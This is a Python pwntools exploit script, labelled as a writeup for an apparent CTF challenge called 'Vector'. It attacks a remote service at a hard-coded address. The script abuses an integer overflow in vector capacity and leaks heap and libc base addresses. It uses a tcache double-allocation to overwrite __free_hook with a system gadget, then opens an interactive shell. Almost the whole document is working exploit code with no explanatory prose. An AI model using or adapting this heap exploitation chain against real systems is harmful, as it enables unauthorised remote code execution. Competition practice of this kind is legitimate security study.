# coding: utf-8
from __future__ import print_function, division
from pwn import *

# socat TCP-L:3001,reuseaddr,fork EXEC:./execfile

'''
# Vector Writeup

'''

log = False
is_gaibu = True

# target_got =

if is_gaibu:
    host = "34.97.74.235"
    # host = "localhost"
    port = 30001
else:
    host = "127.0.0.1"
    port = 3001


def proof_of_work(r):
    r.recvuntil('proof-of-work')
    r.recvuntil('$')
    l = r.recvline().strip('\n')
    io = process(l, shell=True)
    l = io.recvline().strip('\n')
    r.sendline(l)


def wait_for_attach():
    if is_gaibu:
        return
    print('attach?')
    raw_input()


def char2u8(c):
    if c < 0:
        return 256 + c
    else:
        return c


r = remote(host, port)

# proof_of_work(r)


def recvuntil(s, verbose=True):
    s = r.recvuntil(s)
    if log and verbose:
        print(s)
    return s


def sendline(s):
    r.sendline(s)


def get_val():
    s = recvuntil('-------------')
    return int(s.split('val: ')[1].split('\n')[0])


def send_name(name):
    recvuntil('name: ')
    sendline(str(name))


def send_val(value):
    recvuntil('value: ')
    sendline(str(value))


def send_index(index):
    recvuntil('index: ')
    sendline(str(index))


def select(v):
    recvuntil('> ', True)
    sendline(str(v))


def new(s):
    select(1)
    send_name(s)


def concat(v1, v2, v3):
    select(2)
    send_name(v1)
    send_name(v2)
    send_name(v3)


def push(name, data):
    select(3)
    send_name(name)
    send_val(data)


def set(name, index, value):
    select(4)
    send_name(name)
    send_index(index)
    send_val(value)


def get(name, index):
    select(5)
    send_name(name)
    send_index(index)
    return get_val()


v = 0
new(v)

# create vectors. capacity: 2^0, 2^1, ..., 2^31
vectors = [v]
for w in range(1, 16):
    concat(v, v, w)
    vectors.append(w)
    v = w

# integer overflow. cap = 0xfffc + 0x4 = 0
# in order to create cap 0xfff8 vectors, concat vectors by greedy

target_size = 0xfffc - (2 ** vectors[15])
target = 32
concat(14, 14, target)
while target_size != 0:
    for v in reversed(vectors):
        size = 2 ** v
        if size <= target_size:
            print(target_size)
            target_size -= size
            concat(target, v, target + 1)
            target = target + 1

# heap address leak
new(99)
new(98)
new(97)

for i in range(20):
    push(target, 0)

for i in range(3):
    push(target, 0x21)
    for i in range(7 + 24):
        push(target, 0)

push(target, 0x21)
push(target, 0xb)
for i in range(6):
    push(target, 0)

for i in range(14 * 8):
    push(target, 0)

# mark
push(target, 10)

concat(4, 4, 98)
concat(4, 4, 99)

s = b''
for i in range(8):
    s += chr(char2u8(get(target, 28 + i)))

heap_base = u64(s) - 0xd04b0
print('heap_base: ', hex(heap_base))

concat(10, 10, 96)
concat(10, 10, 95)
new(96)

s = b''
for i in range(8):
    s += chr(char2u8(get(target, 0xdc + i)))

main_arena = u64(s)
libc_base = main_arena - 0x3ebca0
print('libc_addr: ', hex(libc_base))

new(95)  # merge big buf

# tcache dup
concat(4, 4, 94)
concat(4, 4, 93)
concat(5, 5, 94)

free_hook_offset = 0x3ed8e8 - 4
free_hook = libc_base + free_hook_offset

for i, x in enumerate(p64(free_hook)):
    set(target, 0xdc + i, ord(x))

concat(4, 4, 92)
concat(4, 4, 91)

wait_for_attach()

system_offset = 0x4f322
system_addr = libc_base + system_offset
for i, x in enumerate(p64(system_addr)):
    push(91, ord(x))

concat(8, 8, 90)
# free (system)
concat(8, 8, 90)

r.interactive()
